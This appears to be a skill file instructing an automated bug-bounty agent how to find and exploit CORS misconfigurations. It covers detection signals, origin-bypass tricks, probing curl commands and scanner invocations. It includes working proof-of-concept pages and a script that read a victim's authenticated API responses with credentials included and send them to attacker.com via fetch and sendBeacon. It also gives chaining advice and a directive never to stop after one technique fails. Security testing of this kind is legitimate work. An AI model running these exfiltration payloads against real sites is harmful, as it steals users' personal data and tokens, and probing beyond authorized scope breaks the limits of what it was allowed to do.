---
name: hunt-cors
description: "Use this skill when the response contains Access-Control-Allow-Origin / Access-Control-Allow-Credentials headers, when you see preflight OPTIONS requests, when an API is reachable from a different origin, or when JS uses fetch with credentials:'include'. Load automatically when the target exposes a JSON API used by a SPA, when you find /api endpoints returning JSON with auth cookies, or when scope mentions REST/GraphQL APIs. Only invoke if real impact potential exists — credential theft, sensitive data exfil, or auth-bypass chain. Skip theoretical findings: ACAO:* alone with NO credentials and NO sensitive data is NOT a bug."
type: hunt
---

# Hunt: CORS Misconfiguration

## Crown Jewel Targets
- **Reflected origin + ACAC: true** on an authenticated endpoint returning PII, tokens, API keys, balance — Critical, instant payout
- **Subdomain trust + subdomain takeover** — `ACAO: *.target.com` + dangling `staging.target.com` = full credential theft (Critical chain)
- **null origin trust + ACAC: true** — exploit via sandbox iframe `<iframe sandbox="allow-scripts" src="data:text/html,...">` (High)
- **Pre-auth API CORS leak** — sensitive endpoints (admin panel JSON) reachable from any origin with cookies
- **GraphQL endpoint with permissive CORS** — exfil entire schema + queries cross-origin
- **OAuth token endpoint with CORS** — pull authorization codes cross-origin

## Detection Signals
- Response headers:
  - `Access-Control-Allow-Origin: <reflected>` ← bug
  - `Access-Control-Allow-Origin: null` ← bug if ACAC also true
  - `Access-Control-Allow-Credentials: true` ← amplifier (without it ACAO has little impact)
  - `Access-Control-Allow-Origin: *` + sensitive data ← bug if no auth needed
  - `Vary: Origin` ← reflection often present
- Preflight: `OPTIONS` requests with `Origin:` and `Access-Control-Request-Method:`
- JS: `fetch(url, {credentials: 'include'})`, `xhr.withCredentials = true`
- API base URLs different from page origin (`api.target.com` from `app.target.com`)

## Attack Techniques
1. **Origin reflection** — send `Origin: https://evil.com`, server echoes it in `ACAO`. If `ACAC: true`, attacker page exfils data with victim's cookies.
2. **Null origin** — sandbox iframe / data: URI / file:// produces `Origin: null`. If server trusts null, exploit via `<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>fetch(...)</script>">`.
3. **Suffix bug** — server regex `Origin.*target\.com` matches `eviltarget.com`. Register `evil-target.com` or `targetevil.com`.
4. **Prefix bug** — server `startsWith("https://target.com")` matches `https://target.com.evil.com`.
5. **Subdomain wildcard + takeover** — server trusts `*.target.com`. Find dangling CNAME, claim subdomain, exploit. Chain with `hunt-subdomain-takeover`.
6. **Subdomain XSS pivot** — any XSS on `*.target.com` becomes credential theft on `api.target.com` via CORS trust.
7. **Protocol downgrade trust** — server trusts both `http://` and `https://target.com` — MITM on HTTP page → exfil HTTPS API.
8. **Special chars in regex** — `target.com` parsed by weak regex matches `target_com`, `target-com`, or any-char positions.
9. **Pre-flight bypass** — `Content-Type: text/plain` makes request "simple", no preflight needed; abuse JSON endpoints that accept `text/plain` body.
10. **GET with credentials** — most damaging — no preflight, no CSRF token, attacker page does `fetch(...,{credentials:'include'})` and reads response.

## Payloads
**Probing curl:**
```bash
curl -sI -H "Origin: https://evil.com" https://api.target.com/me | grep -iE 'access-control|vary'
curl -sI -H "Origin: null" https://api.target.com/me | grep -iE 'access-control'
curl -sI -H "Origin: https://target.com.evil.com" https://api.target.com/me | grep -i access-control
curl -sI -H "Origin: https://eviltarget.com" https://api.target.com/me | grep -i access-control
curl -sI -H "Origin: https://evil.target.com" https://api.target.com/me | grep -i access-control
curl -sI -H "Origin: http://target.com" https://api.target.com/me | grep -i access-control
```

**Reflected origin PoC (host on attacker.com):**
```html
<!DOCTYPE html>
<html><body>
<h1>CORS PoC</h1>
<script>
fetch('https://api.target.com/me', {credentials: 'include'})
  .then(r => r.text())
  .then(d => {
    document.body.innerText = d;
    fetch('https://attacker.com/log?d=' + encodeURIComponent(d));
  });
</script>
</body></html>
```

**Null origin PoC:**
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>
fetch('https://api.target.com/me',{credentials:'include'})
 .then(r=>r.text())
 .then(d=>fetch('https://attacker.com/?d='+btoa(d),{mode:'no-cors'}))
</script>"></iframe>
```

**Subdomain wildcard exploit (after takeover or XSS on *.target.com):**
```js
fetch('https://api.target.com/admin/users', {credentials:'include'})
  .then(r=>r.json()).then(d=>navigator.sendBeacon('//attacker.com',JSON.stringify(d)));
```

## Bypass Methods
| Server Check | Bypass |
|--------------|--------|
| `Origin == "https://target.com"` | (cannot bypass — strict equality is secure) |
| `Origin.endsWith("target.com")` | `https://eviltarget.com`, `https://attackertarget.com` |
| `Origin.startsWith("https://target.com")` | `https://target.com.evil.com`, `https://target.com@evil.com` (browser will not send this Origin — useless here, but works in some server validators) |
| Regex `target\.com` (no anchors) | `https://target.com.evil.com`, `https://eviltarget.com` |
| Regex `https?://.*\.target\.com` | Register `xn--target-...com` IDN; or subdomain takeover |
| Whitelist of subdomains | Pop XSS on any whitelisted subdomain, exfil from there |
| `Origin: null` trusted | Sandbox iframe, data: URL, file:// |
| `Vary: Origin` cache | Test if shared cache serves wrong origin's ACAO (cache poisoning) |
| Pre-flight requires `Authorization` | Use cookie-based auth, no preflight needed for simple GET |

## Tools
```bash
# CORScanner
python cors_scan.py -u https://api.target.com/me -d --headers "Cookie: session=..."

# Corsy
python corsy.py -u https://api.target.com -i urls.txt -t 50 --headers "Cookie: ..."

# ffuf with origin fuzzing
ffuf -u https://api.target.com/me -H "Origin: https://FUZZ" -w cors-origins.txt -mr 'Access-Control'

# Burp Suite — manual via Repeater, set Origin header, observe ACAO/ACAC
# Burp extension: CORS* by IAmStan

# Manual triage one-liner
for o in evil.com target.com.evil.com eviltarget.com null https://target.com http://target.com; do
  echo "[$o]"; curl -sI -H "Origin: $o" https://api.target.com/me | grep -iE 'access-control'; done
```

## Impact
- **Critical**: Reflected origin + ACAC:true + sensitive endpoint (PII / tokens / admin data) returned with credentials
- **High**: Null origin + ACAC:true; subdomain trust + takeover; XSS on trusted subdomain → cross-origin theft
- **Medium**: Pre-auth sensitive data with ACAO:* (no creds needed but data is sensitive — e.g., internal docs, API keys in JSON)
- **NOT A BUG (always rejected)**:
  - `ACAO: *` on public endpoint with no sensitive data
  - Reflected origin but `ACAC: false` and endpoint has no auth/data
  - Trusted origins are only first-party (`*.target.com` is fine if no takeover possible)

## Chain Potential
- **+ Subdomain takeover** = trust on `*.target.com` becomes credential theft (Critical)
- **+ XSS on subdomain** = trusted-origin XSS reads cross-origin API data
- **+ Cache poisoning** = poison `Vary: Origin` cache, serve attacker-controlled ACAO to all victims
- **+ DNS rebinding** = bypass IP-based origin checks
- **+ Cookie scoping** = combine with parent-domain cookie set via subdomain takeover
- **+ OAuth** = exfil authorization code from callback endpoint cross-origin
- **+ CSRF** = CORS-relaxed endpoints often skip CSRF tokens — chain to state-changing requests

## Fallback Chain
1. If origin reflection blocked, test `null`, subdomain variants, and prefix/suffix bypasses before declaring fixed.
2. If ACAC is false, look for endpoints returning sensitive data without auth (API keys, internal hostnames in JSON) — ACAO:* still wins there.
3. If primary origin validation is solid, hunt subdomain trust + check every `*.target.com` for takeover or XSS — that one weak subdomain is the chain.
4. Pivot to alternative cross-origin reads: postMessage, JSONP endpoints, WebSocket without origin check, server-sent events. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| Permissive CORS policy trusting arbitrary extensions origin | Grammarly | $500 | H1 #412490 |
| **Exploiting Misconfigured CORS to Steal User Information** | Rockstar Games | $500 | H1 #317391 |
| Proxy-Authorization not cleared on cross-origin redirect (undici) | Internet Bug Bounty | $420 | H1 #2451113 |
| Site-wide CSRF on Safari due to CORS misconfig | CS Money | $300 | H1 #975983 |
| CORS bypass on TikTok Ads Endpoint | TikTok | $257 | H1 #1001951 |
| CORS Misconfig on zomato.com → sensitive info disclosure | Eternal/Zomato | $244 | H1 |
| DoS to WP-JSON API by cache poisoning the CORS allow origin header | Automattic | $405 | H1 #591302 |
| Eval-based XSS via cross-origin postMessage | Mail.ru | $200 | H1 #1071294 |
| Cross-origin issue with cookies on cross-domain redirect (curl) | curl | $0 | H1 #3516878 |
| Digest Auth State Leak on Cross-Origin Redirect (curl/netrc) | curl | $0 | H1 #3680038 |
| CORS Misconfig on nordvpn.com → Private Info Disclosure/ATO | Nord Security | $21 (low) | H1 |
| Insecure CORS dev-unifi-go.ubnt.com → Stealing Cookies | Ubiquiti | $12 (low) | H1 |
| CORS Misconfig on trust.yelp.com | Yelp | $0 | H1 #1716286 |
| CORS Misconfig on Yelp | Yelp | $0 | H1 #1707616 |
| CORS Misconfig on Xiaomi → user info disclosure | Xiaomi | $32 (low) | H1 |
| BTFS misconfigured CORS → HPP and SOP bypass | BTFS | $0 | H1 |

**PROVEN patterns** (3+ reports): origin reflection without allowlist + `Access-Control-Allow-Credentials: true` (Grammarly, Rockstar, TikTok, Ubiquiti), CORS misconfig leading to ATO via subdomain trust (NordVPN), `null` origin trusted (sandbox iframe abuse), preflight cache poisoning to DoS APIs (Automattic).

## High-Value Chains (from Reports)

1. **Origin-reflected ACAO + ACAC:true → cross-origin read of auth-protected API → ATO**
   - Rockstar Games (H1 #317391, $500) — origin echoed, credentials allowed; attacker page read `/api/me` cross-origin and harvested PII/tokens.
2. **Subdomain takeover or XSS on allowlisted `*.target.com` → bypass CORS allowlist**
   - Pattern across Roblox/Uber chains — once any subdomain is controlled, CORS-trusted access to main API is unlocked.
3. **`null` origin trusted → sandboxed iframe attack → API read**
   - Grammarly (H1 #412490, $500) — extension trusted any origin including `null`; attacker hosted iframe with `sandbox` to inherit `null` origin.
4. **Preflight cache poisoning → API DoS**
   - Automattic WP-JSON (H1 #591302, $405) — cached CORS preflight with attacker origin blocked legitimate users from accessing API.
5. **CORS on internal admin subdomain → cross-origin admin action**
   - Ubiquiti (H1, $12 low) — internal `dev-` subdomain trusted external origins; attacker page issued authenticated admin requests.
